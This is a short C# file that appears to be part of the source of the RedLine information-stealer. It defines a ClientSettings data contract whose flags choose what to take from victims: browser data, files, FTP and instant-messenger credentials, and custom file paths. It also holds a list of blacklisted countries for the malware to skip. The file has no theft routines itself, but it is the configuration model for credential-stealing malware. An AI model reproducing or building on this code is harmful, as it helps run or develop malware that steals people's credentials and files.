using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.Models
{
  [DataContract(Name = "ClientSettings", Namespace = "v1/Models")]
  public class ClientSettings
  {
    [DataMember(Name = "GrabBrowsers")]
    public bool GrabBrowsers { get; set; }

    [DataMember(Name = "GrabFiles")]
    public bool GrabFiles { get; set; }

    [DataMember(Name = "GrabFTP")]
    public bool GrabFTP { get; set; }

    [DataMember(Name = "GrabImClients")]
    public bool GrabImClients { get; set; }

    [DataMember(Name = "GrabPaths")]
    public IList<string> GrabPaths { get; set; }

    [DataMember(Name = "BlacklistedCountry")]
    public IList<string> BlacklistedCountry { get; set; }
  }
}
